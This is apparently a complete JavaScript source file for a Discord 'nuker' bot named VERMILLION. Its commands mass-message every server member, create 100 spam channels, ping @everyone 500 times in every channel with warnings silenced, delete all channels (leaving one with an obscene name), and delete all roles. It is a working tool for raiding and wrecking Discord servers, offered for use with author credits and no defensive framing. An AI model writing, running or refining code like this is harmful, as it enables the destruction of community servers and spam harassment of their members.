const Discord = require('discord.js');
const config = require('./config.json');
const client = new Discord.Client();




client.on("ready", () => {
	console.log('\x1b[37m',"-------------------------------------------------------------------------")
	console.log('\x1b[31m',"#     # ####### ######  #     # ### #       #       ### ####### #     # ")
	console.log(" #     # #       #     # ##   ##  #  #       #        #  #     # ##    # ")
	console.log(" #     # #       #     # # # # #  #  #       #        #  #     # # #   # ")
	console.log(" #     # #####   ######  #  #  #  #  #       #        #  #     # #  #  # ")
	console.log("  #   #  #       #   #   #     #  #  #       #        #  #     # #   # # ")
	console.log("   # #   #       #    #  #     #  #  #       #        #  #     # #    ## ")
	console.log("    #    ####### #     # #     # ### ####### ####### ### ####### #     # ")
	console.log('\x1b[37m',"-------------------------------------------------------------------------")
	console.log(" ")
	console.log('\x1b[31m',"[Bot Info] Prefix: +")
	console.log(" [Bot Info] Use +help for a list of commands.")
	console.log(" [Credit] This bot was made by SP0NG.")
	console.log(" [Credit] Special thanks to MyNameIsThat.")
	console.log(" ")
	console.log('\x1b[37m',"--System Log:--")
	console.log('\x1b[31m',">VERMILLION is now online.")
})

client.on("message", async message => {
	  if(message.author.bot) return;
      const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
      const command = args.shift().toLowerCase();
  
  	  	  if(command === "help"){
		  console.log(">Help Command was executed")
		  console.log(" ")
		  console.log('\x1b[37m',"--VERMILLION Command List:--")
		  console.log('\x1b[31m',"+help (Shows list of available commands.)")
		  console.log(" +dmall <text> (Sends all users a dm.)")
		  console.log(" +channelnuke <name> (Creates 100 text channels with the same name, please use _ or - instead of a space.)")
		  console.log(" +pingnuke (Pings everyone 500 times from every channel, WARNING: THIS COMMAND CAN NOT BE STOPPED!)")
		  console.log(" +deletechannels (Replaces all text channels with just one.)")
		  console.log(" +deleteroles (Deletes all roles.)")
		  console.log(" ")
		  }
	  
	  if(command === "dmall"){
		var text = args[0];
		message.delete();
		message.guild.members.cache.forEach(member => {
			if (member.id != client.user.id && !member.user.bot) member.send(text);
			console.log(">Dmall command was excuted.")
			if (text === undefined){
				console.log(">ERROR EXCUTING DMALL COMMAND: Please specify the message to send everyone.")
			}
		})
	  }
	  
	  if(command === "channelnuke"){
		 message.delete
		 var channelname = args[0]
		 var channelnumber = 1
		 if(channelname === undefined){
			 console.log(">ERROR EXECUTING CHANNELNUKE COMMAND: Please specify the name for the channels.")
		 }else {
			 console.log(">Channelnuke command was executed")
			 for (let step = 0; step < 100; step++) {
				message.guild.channels.create(channelname + channelnumber ,{type: 'text'})
				console.log(`>Made channel ${channelname} ${channelnumber}`)
				var channelnumber = channelnumber + 1
		 }

		 }

	  }
	  
	  if(command === "pingnuke"){
		  message.delete
			for(let i =0;i<=500;i++){
				console.warn = () => {};
				message.guild.channels.cache.filter(r => r.type === "text").forEach(channel => {
					channel.send("@everyone")
				})
			}
	  }
	 
	  if(command === "deletechannels"){
		  message.delete
		  message.guild.channels.create("FUCKED BY VERMILLION",{type: 'text'})
		  message.guild.channels.cache.forEach(channel => channel.delete())
		  console.log(">Deletechannels command was executed.")
	  }
	 
	  if(command === "deleteroles"){
		  message.delete
		  console.log(">Deleteroles command was executed.")
		  message.guild.roles.cache.forEach(roles => {
			  roles.delete()
			  .then(deleted => console.log(`>Deleted role ${deleted.name}`))
		  })
	  }

})





client.login(config.token)